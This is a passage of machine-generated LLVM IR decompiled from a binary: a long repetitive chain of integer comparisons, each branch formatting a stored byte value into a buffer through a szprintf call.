  %v4_10004e28 = zext i8 %v3_10004e28 to i32
  %v4_10004e58 = call i32 @szprintf(i32 %v2_10004e14, i32 ptrtoint ([14 x i8]* @global_var_10015580.134 to i32), i32 %v4_10004e28)
  br label %dec_label_pc_10004e5c

dec_label_pc_10004e5c:                            ; preds = %dec_label_pc_10004e08, %dec_label_pc_10004e14
  %v3_10004e60 = icmp eq i32 %v2_10003364, 82
  br i1 %v3_10004e60, label %dec_label_pc_10004e68, label %dec_label_pc_10004eb0

dec_label_pc_10004e68:                            ; preds = %dec_label_pc_10004e5c
  %v2_10004e68 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e7c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004e7c = zext i8 %v3_10004e7c to i32
  %v4_10004eac = call i32 @szprintf(i32 %v2_10004e68, i32 ptrtoint ([14 x i8]* @global_var_10015590.135 to i32), i32 %v4_10004e7c)
  br label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004e5c, %dec_label_pc_10004e68
  %v3_10004eb4 = icmp eq i32 %v2_10003364, 83
  br i1 %v3_10004eb4, label %dec_label_pc_10004ebc, label %dec_label_pc_10004f04

dec_label_pc_10004ebc:                            ; preds = %dec_label_pc_10004eb0
  %v2_10004ebc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ed0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004ed0 = zext i8 %v3_10004ed0 to i32
  %v4_10004f00 = call i32 @szprintf(i32 %v2_10004ebc, i32 ptrtoint ([15 x i8]* @global_var_100155a0.136 to i32), i32 %v4_10004ed0)
  br label %dec_label_pc_10004f04

dec_label_pc_10004f04:                            ; preds = %dec_label_pc_10004eb0, %dec_label_pc_10004ebc
  %v3_10004f08 = icmp eq i32 %v2_10003364, 84
  br i1 %v3_10004f08, label %dec_label_pc_10004f10, label %dec_label_pc_10004f58

dec_label_pc_10004f10:                            ; preds = %dec_label_pc_10004f04
  %v2_10004f10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f24 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004f24 = zext i8 %v3_10004f24 to i32
  %v4_10004f54 = call i32 @szprintf(i32 %v2_10004f10, i32 ptrtoint ([14 x i8]* @global_var_100155b0.137 to i32), i32 %v4_10004f24)
  br label %dec_label_pc_10004f58

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004f04, %dec_label_pc_10004f10
  %v3_10004f5c = icmp eq i32 %v2_10003364, 85
  br i1 %v3_10004f5c, label %dec_label_pc_10004f64, label %dec_label_pc_10004fac

dec_label_pc_10004f64:                            ; preds = %dec_label_pc_10004f58
  %v2_10004f64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f78 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004f78 = zext i8 %v3_10004f78 to i32
  %v4_10004fa8 = call i32 @szprintf(i32 %v2_10004f64, i32 ptrtoint ([14 x i8]* @global_var_100155c0.138 to i32), i32 %v4_10004f78)
  br label %dec_label_pc_10004fac

dec_label_pc_10004fac:                            ; preds = %dec_label_pc_10004f58, %dec_label_pc_10004f64
  %v3_10004fb0 = icmp eq i32 %v2_10003364, 86
  br i1 %v3_10004fb0, label %dec_label_pc_10004fb8, label %dec_label_pc_10005000

dec_label_pc_10004fb8:                            ; preds = %dec_label_pc_10004fac
  %v2_10004fb8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004fcc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004fcc = zext i8 %v3_10004fcc to i32
  %v4_10004ffc = call i32 @szprintf(i32 %v2_10004fb8, i32 ptrtoint ([14 x i8]* @global_var_100155d0.139 to i32), i32 %v4_10004fcc)
  br label %dec_label_pc_10005000

dec_label_pc_10005000:                            ; preds = %dec_label_pc_10004fac, %dec_label_pc_10004fb8
  %v3_10005004 = icmp eq i32 %v2_10003364, 87
  br i1 %v3_10005004, label %dec_label_pc_1000500c, label %dec_label_pc_10005054

dec_label_pc_1000500c:                            ; preds = %dec_label_pc_10005000
  %v2_1000500c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005020 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005020 = zext i8 %v3_10005020 to i32
  %v4_10005050 = call i32 @szprintf(i32 %v2_1000500c, i32 ptrtoint ([14 x i8]* @global_var_100155e0.140 to i32), i32 %v4_10005020)
  br label %dec_label_pc_10005054

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005000, %dec_label_pc_1000500c
  %v3_10005058 = icmp eq i32 %v2_10003364, 88
  br i1 %v3_10005058, label %dec_label_pc_10005060, label %dec_label_pc_100050a8

dec_label_pc_10005060:                            ; preds = %dec_label_pc_10005054
  %v2_10005060 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005074 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005074 = zext i8 %v3_10005074 to i32
  %v4_100050a4 = call i32 @szprintf(i32 %v2_10005060, i32 ptrtoint ([14 x i8]* @global_var_100155f0.141 to i32), i32 %v4_10005074)
  br label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005054, %dec_label_pc_10005060
  %v3_100050ac = icmp eq i32 %v2_10003364, 89
  br i1 %v3_100050ac, label %dec_label_pc_100050b4, label %dec_label_pc_100050fc

dec_label_pc_100050b4:                            ; preds = %dec_label_pc_100050a8
  %v2_100050b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100050c8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100050c8 = zext i8 %v3_100050c8 to i32
  %v4_100050f8 = call i32 @szprintf(i32 %v2_100050b4, i32 ptrtoint ([14 x i8]* @global_var_10015600.142 to i32), i32 %v4_100050c8)
  br label %dec_label_pc_100050fc

dec_label_pc_100050fc:                            ; preds = %dec_label_pc_100050a8, %dec_label_pc_100050b4
  %v3_10005100 = icmp eq i32 %v2_10003364, 90
  br i1 %v3_10005100, label %dec_label_pc_10005108, label %dec_label_pc_10005150

dec_label_pc_10005108:                            ; preds = %dec_label_pc_100050fc
  %v2_10005108 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000511c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000511c = zext i8 %v3_1000511c to i32
  %v4_1000514c = call i32 @szprintf(i32 %v2_10005108, i32 ptrtoint ([13 x i8]* @global_var_10015610.143 to i32), i32 %v4_1000511c)
  br label %dec_label_pc_10005150

dec_label_pc_10005150:                            ; preds = %dec_label_pc_100050fc, %dec_label_pc_10005108
  %v3_10005154 = icmp eq i32 %v2_10003364, 91
  br i1 %v3_10005154, label %dec_label_pc_1000515c, label %dec_label_pc_100051a4

dec_label_pc_1000515c:                            ; preds = %dec_label_pc_10005150
  %v2_1000515c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005170 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005170 = zext i8 %v3_10005170 to i32
  %v4_100051a0 = call i32 @szprintf(i32 %v2_1000515c, i32 ptrtoint ([13 x i8]* @global_var_10015620.144 to i32), i32 %v4_10005170)
  br label %dec_label_pc_100051a4

dec_label_pc_100051a4:                            ; preds = %dec_label_pc_10005150, %dec_label_pc_1000515c
  %v3_100051a8 = icmp eq i32 %v2_10003364, 92
  br i1 %v3_100051a8, label %dec_label_pc_100051b0, label %dec_label_pc_100051f8

dec_label_pc_100051b0:                            ; preds = %dec_label_pc_100051a4
  %v2_100051b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100051c4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100051c4 = zext i8 %v3_100051c4 to i32
  %v4_100051f4 = call i32 @szprintf(i32 %v2_100051b0, i32 ptrtoint ([13 x i8]* @global_var_10015630.145 to i32), i32 %v4_100051c4)
  br label %dec_label_pc_100051f8

dec_label_pc_100051f8:                            ; preds = %dec_label_pc_100051a4, %dec_label_pc_100051b0
  %v3_100051fc = icmp eq i32 %v2_10003364, 93
  br i1 %v3_100051fc, label %dec_label_pc_10005204, label %dec_label_pc_1000524c

dec_label_pc_10005204:                            ; preds = %dec_label_pc_100051f8
  %v2_10005204 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005218 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005218 = zext i8 %v3_10005218 to i32
  %v4_10005248 = call i32 @szprintf(i32 %v2_10005204, i32 ptrtoint ([13 x i8]* @global_var_10015640.146 to i32), i32 %v4_10005218)
  br label %dec_label_pc_1000524c

dec_label_pc_1000524c:                            ; preds = %dec_label_pc_100051f8, %dec_label_pc_10005204
  %v3_10005250 = icmp eq i32 %v2_10003364, 94
  br i1 %v3_10005250, label %dec_label_pc_10005258, label %dec_label_pc_100052a0

dec_label_pc_10005258:                            ; preds = %dec_label_pc_1000524c
  %v2_10005258 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000526c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000526c = zext i8 %v3_1000526c to i32
  %v4_1000529c = call i32 @szprintf(i32 %v2_10005258, i32 ptrtoint ([13 x i8]* @global_var_10015330.97 to i32), i32 %v4_1000526c)
  br label %dec_label_pc_100052a0

dec_label_pc_100052a0:                            ; preds = %dec_label_pc_1000524c, %dec_label_pc_10005258
  %v3_100052a4 = icmp eq i32 %v2_10003364, 95
  br i1 %v3_100052a4, label %dec_label_pc_100052ac, label %dec_label_pc_100052f4

dec_label_pc_100052ac:                            ; preds = %dec_label_pc_100052a0
  %v2_100052ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100052c0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100052c0 = zext i8 %v3_100052c0 to i32
  %v4_100052f0 = call i32 @szprintf(i32 %v2_100052ac, i32 ptrtoint ([13 x i8]* @global_var_10015650.147 to i32), i32 %v4_100052c0)
  br label %dec_label_pc_100052f4

dec_label_pc_100052f4:                            ; preds = %dec_label_pc_100052a0, %dec_label_pc_100052ac
  %v3_100052f8 = icmp eq i32 %v2_10003364, 96
  br i1 %v3_100052f8, label %dec_label_pc_10005300, label %dec_label_pc_10005348

dec_label_pc_10005300:                            ; preds = %dec_label_pc_100052f4
  %v2_10005300 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005314 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005314 = zext i8 %v3_10005314 to i32
  %v4_10005344 = call i32 @szprintf(i32 %v2_10005300, i32 ptrtoint ([13 x i8]* @global_var_10015360.100 to i32), i32 %v4_10005314)
  br label %dec_label_pc_10005348

dec_label_pc_10005348:                            ; preds = %dec_label_pc_100052f4, %dec_label_pc_10005300
  %v3_1000534c = icmp eq i32 %v2_10003364, 97
  br i1 %v3_1000534c, label %dec_label_pc_10005354, label %dec_label_pc_1000539c

dec_label_pc_10005354:                            ; preds = %dec_label_pc_10005348
  %v2_10005354 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005368 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005368 = zext i8 %v3_10005368 to i32
  %v4_10005398 = call i32 @szprintf(i32 %v2_10005354, i32 ptrtoint ([14 x i8]* @global_var_10015500.126 to i32), i32 %v4_10005368)
  br label %dec_label_pc_1000539c

dec_label_pc_1000539c:                            ; preds = %dec_label_pc_10005348, %dec_label_pc_10005354
  %v3_100053a0 = icmp eq i32 %v2_10003364, 98
  br i1 %v3_100053a0, label %dec_label_pc_100053a8, label %dec_label_pc_100053f0

dec_label_pc_100053a8:                            ; preds = %dec_label_pc_1000539c
  %v2_100053a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100053bc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100053bc = zext i8 %v3_100053bc to i32
  %v4_100053ec = call i32 @szprintf(i32 %v2_100053a8, i32 ptrtoint ([13 x i8]* @global_var_10015660.148 to i32), i32 %v4_100053bc)
  br label %dec_label_pc_100053f0

dec_label_pc_100053f0:                            ; preds = %dec_label_pc_1000539c, %dec_label_pc_100053a8
  %v3_100053f4 = icmp eq i32 %v2_10003364, 99
  br i1 %v3_100053f4, label %dec_label_pc_100053fc, label %dec_label_pc_10005444

dec_label_pc_100053fc:                            ; preds = %dec_label_pc_100053f0
  %v2_100053fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005410 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005410 = zext i8 %v3_10005410 to i32
  %v4_10005440 = call i32 @szprintf(i32 %v2_100053fc, i32 ptrtoint ([14 x i8]* @global_var_10015670.149 to i32), i32 %v4_10005410)
  br label %dec_label_pc_10005444

dec_label_pc_10005444:                            ; preds = %dec_label_pc_100053f0, %dec_label_pc_100053fc
  %v3_10005448 = icmp eq i32 %v2_10003364, 100
  br i1 %v3_10005448, label %dec_label_pc_10005450, label %dec_label_pc_10005498

dec_label_pc_10005450:                            ; preds = %dec_label_pc_10005444
  %v2_10005450 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005464 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005464 = zext i8 %v3_10005464 to i32
  %v4_10005494 = call i32 @szprintf(i32 %v2_10005450, i32 ptrtoint ([14 x i8]* @global_var_10015680.150 to i32), i32 %v4_10005464)
  br label %dec_label_pc_10005498

dec_label_pc_10005498:                            ; preds = %dec_label_pc_10005444, %dec_label_pc_10005450
  %v3_1000549c = icmp eq i32 %v2_10003364, 101
  br i1 %v3_1000549c, label %dec_label_pc_100054a4, label %dec_label_pc_100054ec

dec_label_pc_100054a4:                            ; preds = %dec_label_pc_10005498
  %v2_100054a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100054b8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100054b8 = zext i8 %v3_100054b8 to i32
  %v4_100054e8 = call i32 @szprintf(i32 %v2_100054a4, i32 ptrtoint ([13 x i8]* @global_var_10015690.151 to i32), i32 %v4_100054b8)
  br label %dec_label_pc_100054ec

dec_label_pc_100054ec:                            ; preds = %dec_label_pc_10005498, %dec_label_pc_100054a4
  %v3_100054f0 = icmp eq i32 %v2_10003364, 102
  br i1 %v3_100054f0, label %dec_label_pc_100054f8, label %dec_label_pc_10005540

dec_label_pc_100054f8:                            ; preds = %dec_label_pc_100054ec
  %v2_100054f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000550c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000550c = zext i8 %v3_1000550c to i32
  %v4_1000553c = call i32 @szprintf(i32 %v2_100054f8, i32 ptrtoint ([13 x i8]* @global_var_100156a0.152 to i32), i32 %v4_1000550c)
  br label %dec_label_pc_10005540

dec_label_pc_10005540:                            ; preds = %dec_label_pc_100054ec, %dec_label_pc_100054f8
  %v3_10005544 = icmp eq i32 %v2_10003364, 103
  br i1 %v3_10005544, label %dec_label_pc_1000554c, label %dec_label_pc_10005594

dec_label_pc_1000554c:                            ; preds = %dec_label_pc_10005540
  %v2_1000554c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005560 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005560 = zext i8 %v3_10005560 to i32
  %v4_10005590 = call i32 @szprintf(i32 %v2_1000554c, i32 ptrtoint ([13 x i8]* @global_var_100156b0.153 to i32), i32 %v4_10005560)
  br label %dec_label_pc_10005594

dec_label_pc_10005594:                            ; preds = %dec_label_pc_10005540, %dec_label_pc_1000554c
  %v3_10005598 = icmp eq i32 %v2_10003364, 104
  br i1 %v3_10005598, label %dec_label_pc_100055a0, label %dec_label_pc_100055e8

dec_label_pc_100055a0:                            ; preds = %dec_label_pc_10005594
  %v2_100055a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100055b4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100055b4 = zext i8 %v3_100055b4 to i32
  %v4_100055e4 = call i32 @szprintf(i32 %v2_100055a0, i32 ptrtoint ([13 x i8]* @global_var_100156c0.154 to i32), i32 %v4_100055b4)
  br label %dec_label_pc_100055e8

dec_label_pc_100055e8:                            ; preds = %dec_label_pc_10005594, %dec_label_pc_100055a0
  %v3_100055ec = icmp eq i32 %v2_10003364, 105
  br i1 %v3_100055ec, label %dec_label_pc_100055f4, label %dec_label_pc_1000563c

dec_label_pc_100055f4:                            ; preds = %dec_label_pc_100055e8
  %v2_100055f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005608 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005608 = zext i8 %v3_10005608 to i32
  %v4_10005638 = call i32 @szprintf(i32 %v2_100055f4, i32 ptrtoint ([13 x i8]* @global_var_100156d0.155 to i32), i32 %v4_10005608)
  br label %dec_label_pc_1000563c

dec_label_pc_1000563c:                            ; preds = %dec_label_pc_100055e8, %dec_label_pc_100055f4
  %v3_10005640 = icmp eq i32 %v2_10003364, 106
  br i1 %v3_10005640, label %dec_label_pc_10005648, label %dec_label_pc_10005690

dec_label_pc_10005648:                            ; preds = %dec_label_pc_1000563c
  %v2_10005648 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000565c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000565c = zext i8 %v3_1000565c to i32
  %v4_1000568c = call i32 @szprintf(i32 %v2_10005648, i32 ptrtoint ([12 x i8]* @global_var_100156e0.156 to i32), i32 %v4_1000565c)
  br label %dec_label_pc_10005690

dec_label_pc_10005690:                            ; preds = %dec_label_pc_1000563c, %dec_label_pc_10005648
  %v3_10005694 = icmp eq i32 %v2_10003364, 107
  br i1 %v3_10005694, label %dec_label_pc_1000569c, label %dec_label_pc_100056e4

dec_label_pc_1000569c:                            ; preds = %dec_label_pc_10005690
  %v2_1000569c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100056b0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100056b0 = zext i8 %v3_100056b0 to i32
  %v4_100056e0 = call i32 @szprintf(i32 %v2_1000569c, i32 ptrtoint ([14 x i8]* @global_var_100156ec.157 to i32), i32 %v4_100056b0)
  br label %dec_label_pc_100056e4

dec_label_pc_100056e4:                            ; preds = %dec_label_pc_10005690, %dec_label_pc_1000569c
  %v3_100056e8 = icmp eq i32 %v2_10003364, 108
  br i1 %v3_100056e8, label %dec_label_pc_100056f0, label %dec_label_pc_10005738

dec_label_pc_100056f0:                            ; preds = %dec_label_pc_100056e4
  %v2_100056f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005704 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005704 = zext i8 %v3_10005704 to i32
  %v4_10005734 = call i32 @szprintf(i32 %v2_100056f0, i32 ptrtoint ([15 x i8]* @global_var_100156fc.158 to i32), i32 %v4_10005704)
  br label %dec_label_pc_10005738

dec_label_pc_10005738:                            ; preds = %dec_label_pc_100056e4, %dec_label_pc_100056f0
  %v3_1000573c = icmp eq i32 %v2_10003364, 109
  br i1 %v3_1000573c, label %dec_label_pc_10005744, label %dec_label_pc_1000578c

dec_label_pc_10005744:                            ; preds = %dec_label_pc_10005738
  %v2_10005744 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005758 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005758 = zext i8 %v3_10005758 to i32
  %v4_10005788 = call i32 @szprintf(i32 %v2_10005744, i32 ptrtoint ([14 x i8]* @global_var_1001570c.159 to i32), i32 %v4_10005758)
  br label %dec_label_pc_1000578c

dec_label_pc_1000578c:                            ; preds = %dec_label_pc_10005738, %dec_label_pc_10005744
  %v3_10005790 = icmp eq i32 %v2_10003364, 110
  br i1 %v3_10005790, label %dec_label_pc_10005798, label %dec_label_pc_100057e0

dec_label_pc_10005798:                            ; preds = %dec_label_pc_1000578c
  %v2_10005798 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100057ac = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100057ac = zext i8 %v3_100057ac to i32
  %v4_100057dc = call i32 @szprintf(i32 %v2_10005798, i32 ptrtoint ([13 x i8]* @global_var_1001571c.160 to i32), i32 %v4_100057ac)
  br label %dec_label_pc_100057e0

dec_label_pc_100057e0:                            ; preds = %dec_label_pc_1000578c, %dec_label_pc_10005798
  %v3_100057e4 = icmp eq i32 %v2_10003364, 111
  br i1 %v3_100057e4, label %dec_label_pc_100057ec, label %dec_label_pc_10005834

dec_label_pc_100057ec:                            ; preds = %dec_label_pc_100057e0
  %v2_100057ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005800 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005800 = zext i8 %v3_10005800 to i32
  %v4_10005830 = call i32 @szprintf(i32 %v2_100057ec, i32 ptrtoint ([14 x i8]* @global_var_1001572c.161 to i32), i32 %v4_10005800)
  br label %dec_label_pc_10005834

dec_label_pc_10005834:                            ; preds = %dec_label_pc_100057e0, %dec_label_pc_100057ec
  %v3_10005838 = icmp eq i32 %v2_10003364, 112
  br i1 %v3_10005838, label %dec_label_pc_10005840, label %dec_label_pc_10005888

dec_label_pc_10005840:                            ; preds = %dec_label_pc_10005834
  %v2_10005840 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005854 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005854 = zext i8 %v3_10005854 to i32
  %v4_10005884 = call i32 @szprintf(i32 %v2_10005840, i32 ptrtoint ([15 x i8]* @global_var_1001573c.162 to i32), i32 %v4_10005854)
  br label %dec_label_pc_10005888

dec_label_pc_10005888:                            ; preds = %dec_label_pc_10005834, %dec_label_pc_10005840
  %v3_1000588c = icmp eq i32 %v2_10003364, 113
  br i1 %v3_1000588c, label %dec_label_pc_10005894, label %dec_label_pc_100058dc

dec_label_pc_10005894:                            ; preds = %dec_label_pc_10005888
  %v2_10005894 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058a8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100058a8 = zext i8 %v3_100058a8 to i32
  %v4_100058d8 = call i32 @szprintf(i32 %v2_10005894, i32 ptrtoint ([13 x i8]* @global_var_1001574c.163 to i32), i32 %v4_100058a8)
  br label %dec_label_pc_100058dc

dec_label_pc_100058dc:                            ; preds = %dec_label_pc_10005888, %dec_label_pc_10005894
  %v3_100058e0 = icmp eq i32 %v2_10003364, 114
  br i1 %v3_100058e0, label %dec_label_pc_100058e8, label %dec_label_pc_10005930

dec_label_pc_100058e8:                            ; preds = %dec_label_pc_100058dc
  %v2_100058e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058fc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100058fc = zext i8 %v3_100058fc to i32
  %v4_1000592c = call i32 @szprintf(i32 %v2_100058e8, i32 ptrtoint ([14 x i8]* @global_var_1001575c.164 to i32), i32 %v4_100058fc)
  br label %dec_label_pc_10005930

dec_label_pc_10005930:                            ; preds = %dec_label_pc_100058dc, %dec_label_pc_100058e8
  %v3_10005934 = icmp eq i32 %v2_10003364, 115
  br i1 %v3_10005934, label %dec_label_pc_1000593c, label %dec_label_pc_10005984

dec_label_pc_1000593c:                            ; preds = %dec_label_pc_10005930
  %v2_1000593c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005950 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005950 = zext i8 %v3_10005950 to i32
  %v4_10005980 = call i32 @szprintf(i32 %v2_1000593c, i32 ptrtoint ([13 x i8]* @global_var_1001576c.165 to i32), i32 %v4_10005950)
  br label %dec_label_pc_10005984

dec_label_pc_10005984:                            ; preds = %dec_label_pc_10005930, %dec_label_pc_1000593c
  %v3_10005988 = icmp eq i32 %v2_10003364, 116
  br i1 %v3_10005988, label %dec_label_pc_10005990, label %dec_label_pc_100059d8

dec_label_pc_10005990:                            ; preds = %dec_label_pc_10005984
  %v2_10005990 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100059a4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100059a4 = zext i8 %v3_100059a4 to i32
  %v4_100059d4 = call i32 @szprintf(i32 %v2_10005990, i32 ptrtoint ([13 x i8]* @global_var_1001577c.166 to i32), i32 %v4_100059a4)
  br label %dec_label_pc_100059d8

dec_label_pc_100059d8:                            ; preds = %dec_label_pc_10005984, %dec_label_pc_10005990
  %v3_100059dc = icmp eq i32 %v2_10003364, 117
  br i1 %v3_100059dc, label %dec_label_pc_100059e4, label %dec_label_pc_10005a2c

dec_label_pc_100059e4:                            ; preds = %dec_label_pc_100059d8
  %v2_100059e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100059f8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100059f8 = zext i8 %v3_100059f8 to i32
  %v4_10005a28 = call i32 @szprintf(i32 %v2_100059e4, i32 ptrtoint ([14 x i8]* @global_var_1001578c.167 to i32), i32 %v4_100059f8)
  br label %dec_label_pc_10005a2c

dec_label_pc_10005a2c:                            ; preds = %dec_label_pc_100059d8, %dec_label_pc_100059e4
  %v3_10005a30 = icmp eq i32 %v2_10003364, 118
  br i1 %v3_10005a30, label %dec_label_pc_10005a38, label %dec_label_pc_10005a80

dec_label_pc_10005a38:                            ; preds = %dec_label_pc_10005a2c
  %v2_10005a38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005a4c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005a4c = zext i8 %v3_10005a4c to i32
  %v4_10005a7c = call i32 @szprintf(i32 %v2_10005a38, i32 ptrtoint ([14 x i8]* @global_var_1001579c.168 to i32), i32 %v4_10005a4c)
  br label %dec_label_pc_10005a80

dec_label_pc_10005a80:                            ; preds = %dec_label_pc_10005a2c, %dec_label_pc_10005a38
  %v3_10005a84 = icmp eq i32 %v2_10003364, 119
  br i1 %v3_10005a84, label %dec_label_pc_10005a8c, label %dec_label_pc_10005ad4

dec_label_pc_10005a8c:                            ; preds = %dec_label_pc_10005a80
  %v2_10005a8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005aa0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005aa0 = zext i8 %v3_10005aa0 to i32
  %v4_10005ad0 = call i32 @szprintf(i32 %v2_10005a8c, i32 ptrtoint ([14 x i8]* @global_var_100157ac.169 to i32), i32 %v4_10005aa0)
  br label %dec_label_pc_10005ad4

dec_label_pc_10005ad4:                            ; preds = %dec_label_pc_10005a80, %dec_label_pc_10005a8c
  %v3_10005ad8 = icmp eq i32 %v2_10003364, 120
  br i1 %v3_10005ad8, label %dec_label_pc_10005ae0, label %dec_label_pc_10005b28

dec_label_pc_10005ae0:                            ; preds = %dec_label_pc_10005ad4
  %v2_10005ae0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005af4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005af4 = zext i8 %v3_10005af4 to i32
  %v4_10005b24 = call i32 @szprintf(i32 %v2_10005ae0, i32 ptrtoint ([15 x i8]* @global_var_100157bc.170 to i32), i32 %v4_10005af4)
  br label %dec_label_pc_10005b28

dec_label_pc_10005b28:                            ; preds = %dec_label_pc_10005ad4, %dec_label_pc_10005ae0
  %v3_10005b2c = icmp eq i32 %v2_10003364, 121
  br i1 %v3_10005b2c, label %dec_label_pc_10005b34, label %dec_label_pc_10005b7c

dec_label_pc_10005b34:                            ; preds = %dec_label_pc_10005b28
  %v2_10005b34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b48 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005b48 = zext i8 %v3_10005b48 to i32
  %v4_10005b78 = call i32 @szprintf(i32 %v2_10005b34, i32 ptrtoint ([15 x i8]* @global_var_100156fc.158 to i32), i32 %v4_10005b48)
  br label %dec_label_pc_10005b7c

dec_label_pc_10005b7c:                            ; preds = %dec_label_pc_10005b28, %dec_label_pc_10005b34
  %v3_10005b80 = icmp eq i32 %v2_10003364, 122
  br i1 %v3_10005b80, label %dec_label_pc_10005b88, label %dec_label_pc_10005bd0

dec_label_pc_10005b88:                            ; preds = %dec_label_pc_10005b7c
  %v2_10005b88 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b9c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005b9c = zext i8 %v3_10005b9c to i32
  %v4_10005bcc = call i32 @szprintf(i32 %v2_10005b88, i32 ptrtoint ([14 x i8]* @global_var_100157cc.171 to i32), i32 %v4_10005b9c)
  br label %dec_label_pc_10005bd0

dec_label_pc_10005bd0:                            ; preds = %dec_label_pc_10005b7c, %dec_label_pc_10005b88
  %v3_10005bd4 = icmp eq i32 %v2_10003364, 123
  br i1 %v3_10005bd4, label %dec_label_pc_10005bdc, label %dec_label_pc_10005c24

dec_label_pc_10005bdc:                            ; preds = %dec_label_pc_10005bd0
  %v2_10005bdc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005bf0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005bf0 = zext i8 %v3_10005bf0 to i32
  %v4_10005c20 = call i32 @szprintf(i32 %v2_10005bdc, i32 ptrtoint ([12 x i8]* @global_var_100157dc.172 to i32), i32 %v4_10005bf0)
  br label %dec_label_pc_10005c24

dec_label_pc_10005c24:                            ; preds = %dec_label_pc_10005bd0, %dec_label_pc_10005bdc
  %v3_10005c28 = icmp eq i32 %v2_10003364, 124
  br i1 %v3_10005c28, label %dec_label_pc_10005c30, label %dec_label_pc_10005c78

dec_label_pc_10005c30:                            ; preds = %dec_label_pc_10005c24
  %v2_10005c30 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c44 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005c44 = zext i8 %v3_10005c44 to i32
  %v4_10005c74 = call i32 @szprintf(i32 %v2_10005c30, i32 ptrtoint ([14 x i8]* @global_var_100157e8.173 to i32), i32 %v4_10005c44)
  br label %dec_label_pc_10005c78

dec_label_pc_10005c78:                            ; preds = %dec_label_pc_10005c24, %dec_label_pc_10005c30
  %v3_10005c7c = icmp eq i32 %v2_10003364, 125
